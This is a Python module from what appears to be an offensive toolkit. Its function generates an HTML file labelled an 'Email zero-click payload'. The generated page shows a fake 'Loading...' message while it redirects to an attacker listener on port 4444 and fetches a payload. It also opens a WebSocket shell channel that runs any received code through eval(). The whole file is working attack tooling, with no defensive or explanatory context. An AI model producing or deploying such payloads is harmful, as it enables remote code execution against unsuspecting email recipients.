import json
import time
from pathlib import Path

def generate():
    """Generate Email zero-click payload"""
    output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'zero_click'
    output_dir.mkdir(parents=True, exist_ok=True)
    
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        listener_ip = s.getsockname()[0]
        s.close()
    except:
        listener_ip = '0.0.0.0'
    
    config_file = Path('config/megalodon.json')
    if config_file.exists():
        with open(config_file, 'r') as f:
            config = json.load(f)
            listener_port = config.get('listener', {}).get('port', 4444)
    else:
        listener_port = 4444
    
    print("[*] Generating Email zero-click payload...")
    
    html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; url=http://{listener_ip}:{listener_port}/payload">
    <script>
        // Auto-execute on email load
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://{listener_ip}:{listener_port}/payload', true);
        xhr.send();
        
        // Also try WebSocket
        try {{
            var ws = new WebSocket('ws://{listener_ip}:{listener_port}/shell');
            ws.onopen = function() {{
                ws.send('Email payload triggered');
            }};
            ws.onmessage = function(e) {{
                eval(e.data);
            }};
        }} catch(e) {{
            console.log('WebSocket not available');
        }}
    </script>
</head>
<body>
    <h1>Loading...</h1>
    <p>Please wait while the content loads</p>
</body>
</html>
'''
    
    output_file = output_dir / 'email_payload.html'
    with open(output_file, 'w') as f:
        f.write(html_content)
    
    print(f"[+] Email payload created: {output_file}")
    
    return {
        'success': True,
        'payload_file': str(output_file),
        'type': 'email',
        'listener_ip': listener_ip,
        'listener_port': listener_port,
        'message': 'Email zero-click payload generated'
    }
